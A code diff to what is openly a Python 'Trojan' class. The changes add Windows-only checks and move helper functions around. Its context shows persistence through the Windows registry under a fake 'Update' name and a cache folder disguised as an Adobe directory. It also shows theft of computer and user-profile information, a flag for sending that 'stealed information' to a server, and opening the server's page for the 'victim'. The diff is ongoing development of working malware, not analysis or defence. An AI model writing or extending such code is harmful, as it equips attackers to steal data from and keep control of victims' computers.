@@ -13,8 +13,6 @@
 
 # Default modules
 import requests  # Module for making request to web server.
-import webbrowser  # Module for opening browser.
-import winreg  # Module for working with windows registry.
 import os  # Module for working with operating system.
 import sys  # Module for working with operating system.
 import time  # Module for working with time.
@@ -88,7 +86,7 @@ class Trojan:
         self.__setting_sync_remote_access_wait_time = 60
 
         # Folder used as cache.
-        self.__setting_cache_folder = os.getenv("APPDATA") + "\\Adobe\\Storage"
+        self.__setting_cache_folder = self.get_cache_directory()
 
         # Should we send all stealed information on server or not.
         self.__setting_send_stealed_information_to_server = True
@@ -109,6 +107,19 @@ class Trojan:
 
         # Running trojan.
         self.run()
+
+    def get_cache_directory(self) -> str:
+        """
+        Gets cache directory.
+        :return: [str] Cache directory.
+        """
+
+        if self.get_operation_system() == "Windows":
+            # Windows cache directory.
+            return os.getenv("APPDATA") + "\\Adobe\\Storage"
+        else:
+            # Other OS cache directory.
+            return "/"
 
     def generate_unique_request_index(self) -> None:
         """
@@ -156,6 +167,15 @@ class Trojan:
         :return: [None] Not returns any.
         """
 
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system for pushing to the registry")
+
+        try:
+            import winreg  # Module for working with windows registry.
+        except ImportError:
+            return self.show_debug_message("Error when import winreg, not pushed to the registry.")
+
         # Getting file name of the current script.
         file_extension = sys.argv[0].split(".")[-1]
         filename = f"{self.__setting_cache_folder}\\Update\\Update.{file_extension}"
@@ -188,6 +208,15 @@ class Trojan:
         Opens main server URL in the browser, so victim will see message on the main page.
         :return: [None] Not returns any.
         """
+
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system for opening an browser")
+
+        try:
+            import webbrowser  # Module for opening browser.
+        except ImportError:
+            return self.show_debug_message("Error when import webbrowser, message was not showed.")
 
         # Checking server url if down.
         self.check_server_urls()
@@ -244,6 +273,10 @@ class Trojan:
         Steals all information about computer.
         :return: [None] Not returns any.
         """
+
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system for stealing computer information")
 
         # Getting username.
         self.__stealed_information["Computer_Username"] = os.getenv("UserName")
@@ -331,6 +364,10 @@ class Trojan:
         :return: [None] Not returns any.
         """
 
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system for stealing computer information")
+
         # Getting user profile.
         userprofile = os.getenv("userprofile")
 
@@ -374,6 +411,10 @@ class Trojan:
         except (FileExistsError, FileNotFoundError, IsADirectoryError, NotADirectoryError):
             # If there an exception.
 
+            if self.get_operation_system() != "Windows":
+                # If not windows - error.
+                return self.show_debug_message("Unsupported operating system, FILE error!")
+
             # Showing debug message.
             self.show_debug_message("Not sent information on the server, file error occurred!")
 
@@ -399,6 +440,10 @@ class Trojan:
             self.show_debug_message("Created log file in cache directory.")
         except (FileExistsError, NotADirectoryError, FileNotFoundError, UnicodeDecodeError):
             # If exception.
+
+            if self.get_operation_system() != "Windows":
+                # If not windows - error.
+                return self.show_debug_message("Unsupported operating system, FILE error!")
 
             # Showing debug message.
             self.show_debug_message("Not create log file, as there was new exception.")
@@ -859,11 +904,74 @@ class Trojan:
         # Showing ending of the run.
         self.show_debug_message("Ended executing of run() method!")
 
+    def get_hwid(self) -> str:
+        """
+        Gets hardware index of the computer.
+        :return: [str] Hardware Index.
+        """
+
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            self.show_debug_message("Unsupported operating system, HWID error!")
+            return "HWID_UNSUPPORTED_ERROR"
+
+        # Getting computer HWID.
+
+        # Command.
+        command = "wmic csproduct get uuid"
+
+        # Process.
+        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        # Adding it.
+        return (process.stdout.read() + process.stderr.read()).decode().split("\n")[1]
+
+    def path_validate(self, filename: str) -> None:
+        """
+        Validates path.
+        :param filename: [str] Filename
+        :return: [None] Not returns any.
+        """
+
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system, not validating path!")
+
+        # Getting path.
+        path = filename.split("\\")
+        path.pop()
+        path = "\\".join(path)
+
+        if not os.path.exists(path):
+            # If file not found.
+
+            # Creating path.
+            os.makedirs(path)
+
+    @staticmethod
+    def get_operation_system() -> str:
+        """
+        Gets operating system and returns it.
+        :return: [str] Operating system.
+        """
+
+        if sys.platform.startswith('aix'):
+            return "AIX"
+        elif sys.platform.startswith('linux'):
+            return "Linux"
+        elif sys.platform.startswith('win32'):
+            return "Windows"
+        elif sys.platform.startswith('cygwin'):
+            return "Cygwin"
+        elif sys.platform.startswith('darwin'):
+            return "MacOS"
+
     @staticmethod
     def get_ip() -> dict:
         """
         Gets client IP address and location.
-        :return: [dict] Dict where holds IP and location..
+        :return: [dict] Dict where holds IP and location.
         """
 
         # Getting an request.
@@ -897,44 +1005,6 @@ class Trojan:
             return is_reachable
         except requests.exceptions.ConnectionError:
             pass
-
-    @staticmethod
-    def get_hwid() -> str:
-        """
-        Gets hardware index of the computer.
-        :return: [str] Hardware Index.
-        """
-
-        # Getting computer HWID.
-
-        # Command.
-        command = "wmic csproduct get uuid"
-
-        # Process.
-        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
-                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-        # Adding it.
-        return (process.stdout.read() + process.stderr.read()).decode().split("\n")[1]
-
-    @staticmethod
-    def path_validate(filename: str) -> None:
-        """
-        Validates path.
-        :param filename: [str] Filename
-        :return: [None] Not returns any.
-        """
-
-        # Getting path.
-        path = filename.split("\\")
-        path.pop()
-        path = "\\".join(path)
-
-        if not os.path.exists(path):
-            # If file not found.
-
-            # Creating path.
-            os.makedirs(path)
 
 
 if __name__ == "__main__":
